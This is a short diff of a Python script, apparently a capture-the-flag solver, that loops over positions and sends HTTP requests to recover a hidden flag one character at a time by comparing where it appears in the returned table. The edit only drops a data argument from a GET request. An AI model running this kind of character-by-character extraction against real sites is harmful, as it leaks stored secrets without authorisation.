@@ -14,7 +14,7 @@ for i in range(48):
             'password':index
         }
         t=requests.post(url,data=data,timeout=1)
-        t=requests.get(url,data=data,params=param,cookies=cookie,timeout=1).text
+        t=requests.get(url,params=param,cookies=cookie,timeout=1).text
         if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
             print(flag)
